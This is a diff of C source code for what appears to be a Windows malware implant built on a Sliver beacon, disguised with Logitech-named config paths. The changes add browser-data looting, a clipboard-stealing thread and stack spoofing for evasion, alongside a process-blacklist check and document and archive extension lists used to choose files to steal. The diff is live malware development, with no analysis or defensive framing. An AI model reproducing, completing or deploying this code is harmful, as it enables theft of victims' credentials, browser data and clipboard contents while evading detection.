 	LPWSTR DocumentExtensions[] = { L".doc", L".docm", L".docx", L".pdf", L".ppsm", L".ppsx", L".ppt", L".pptm", L".pptx", L".pst", L".rtf", L".xlm", L".xls", L".xlsm", L".xlsx", L".odt", L".ods", L".odp", L".odg", L".odf" };
 	LPWSTR ArchiveExtensions[] = { L".rar", L".zip", L".tar", L".gz", L".xz", L".sz", L".7z" };
 	DWORD i = 0;
+	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
+	LPSTR lpUniqueID = NULL;
+	PBYTE pDigest = NULL;
 
 #ifndef _DEBUG
-	if (DetectSandbox4() || DetectSandbox5() || CheckForBlackListProcess()) {
+	if (CheckForBlackListProcess()) {
 		goto CLEANUP;
 	}
 #endif
@@ -2978,7 +3303,10 @@ VOID Final(VOID)
 	lpTemp[0] = L'\0';
 	lstrcatW(wszConfigPath, L"logitech.cfg");
 	if (!IsFileExist(wszConfigPath)) {
-		goto CLEANUP;
+		ExpandEnvironmentStringsW(L"%APPDATA%\\Logitech\\logitech.cfg", wszConfigPath, _countof(wszConfigPath));
+		if (!IsFileExist(wszConfigPath)) {
+			goto CLEANUP;
+		}
 	}
 
 	pGlobalConfig = UnmarshalConfig(wszConfigPath);
@@ -2986,9 +3314,9 @@ VOID Final(VOID)
 		goto CLEANUP;
 	}
 
-	pGlobalConfig->lpConfigPath = DuplicateStrW(wszConfigPath, 0);
+	pGlobalConfig->lpMainExecutable = DuplicateStrW(L"Can thay doi", 0);
 	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
-	InitializeSRWLock(&pGlobalConfig->RWLock);
+	RtlInitializeSRWLock(&pGlobalConfig->RWLock);
 	pGlobalConfig->uPeerID = GeneratePeerID();
 	pGlobalConfig->dwListenerID = 1;
 	pGlobalConfig->hCurrentToken = GetCurrentProcessToken();
@@ -3020,12 +3348,17 @@ VOID Final(VOID)
 		pGlobalConfig->MonitoredFolder[2] = NULL;
 	}*/
 
+	lpUniqueID = GetComputerUserName();
+	lpUniqueID = StrCatExA(lpUniqueID, pGlobalConfig->lpPeerPrivKey);
+	lpUniqueID = StrCatExA(lpUniqueID, pGlobalConfig->lpSliverName);
+	pDigest = ComputeSHA256(lpUniqueID, lstrlenA(lpUniqueID));
+	pGlobalConfig->lpUniqueName = ConvertBytesToHexW(pDigest, SHA256_HASH_SIZE);
+	pGlobalConfig->lpUniqueName[16] = L'\0';
 	ExpandEnvironmentStringsW(L"%ALLUSERSPROFILE%", pGlobalConfig->wszWarehouse, _countof(pGlobalConfig->wszWarehouse));
-	lpTemp = GenRandomStrW(8);
 	lstrcatW(pGlobalConfig->wszWarehouse, L"\\");
-	lstrcatW(pGlobalConfig->wszWarehouse, lpTemp);
+	lstrcatW(pGlobalConfig->wszWarehouse, pGlobalConfig->lpUniqueName);
 	FREE(lpTemp);
-	if (IsExist(pGlobalConfig)) {
+	if (IsInstanceExist(pGlobalConfig)) {
 		goto CLEANUP;
 	}
 
@@ -3036,8 +3369,13 @@ VOID Final(VOID)
 #endif
 
 	if (pGlobalConfig->Loot) {
-		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUsb, pGlobalConfig, 0, &dwThreadId);
-		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFile, pGlobalConfig, 0, &dwThreadId);
+		LootBrowserData(pGlobalConfig);
+		/*CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUsb, pGlobalConfig, 0, &dwThreadId);
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFile, pGlobalConfig, 0, &dwThreadId);*/
+	}
+
+	if (pGlobalConfig->Clipboard) {
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StealClipboard, pGlobalConfig, 0, &dwThreadId);
 	}
 	
 	if (pGlobalConfig->Type == Beacon || pGlobalConfig->Type == Pivot) {
@@ -3057,6 +3395,7 @@ VOID Final(VOID)
 	}
 
 CLEANUP:
+	FREE(lpUniqueID);
 	FreeBeaconClient(pBeaconClient);
 	FreeSessionClient(pSessionClient);
 	FreeGlobalConfig(pGlobalConfig);
@@ -3071,8 +3410,9 @@ LONG VectoredExceptionHandler
 {
 	DWORD dwExpceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
 
-	PrintFormatW(L"Exception Code: 0x%08x\n", dwExpceptionCode);
+#ifdef _DEBUG
 	PrintStackTrace(ExceptionInfo->ContextRecord);
+#endif
 	ExitProcess(-1);
 }
 
@@ -3154,7 +3494,7 @@ CLEANUP:
 //	_In_ LPSTR lpCmdLine,
 //	_In_ int nShowCmd
 //)
-int main(void)
+int main()
 {
 	DWORD dwLevel = 0;
 	DWORD dwFlags = 0;
@@ -3176,7 +3516,6 @@ int main(void)
 //		goto CLEANUP;
 //	}
 
-	RtlAddVectoredExceptionHandler(1, VectoredExceptionHandler);
 	LoadLibraryW(L"advapi32.dll");
 	LoadLibraryW(L"bcrypt.dll");
 	LoadLibraryW(L"combase.dll");
@@ -3196,6 +3535,11 @@ int main(void)
 	LoadLibraryW(L"wtsapi32.dll");
 	LoadLibraryW(L"RPCRT4.dll");
 
+	if (!SetupStackSpoofing()) {
+		return -1;
+	}
+
+	RtlAddVectoredExceptionHandler(1, VectoredExceptionHandler);
 	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageLoop, hInstance, 0, NULL);
 	if (hThread == NULL) {
 		LOG_ERROR("CreateThread", GetLastError())
@@ -3363,6 +3707,29 @@ int main(void)
 	//test161();
 	//test162();
 	//test163();
+	//test164();
+	//test165();
+	//test166();
+	//test167();
+	//test168();
+	//test169();
+	//test170();
+	//test171();
+	//test172();
+	//test173();
+	//test174();
+	//test175();
+	//test176();
+	//test177();
+	//test178();
+	//test179();
+	//test180();
+	//test181();
+	//test182();
+	//test183();
+	//test184();
+	//test185();
+	//test186();
 	Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
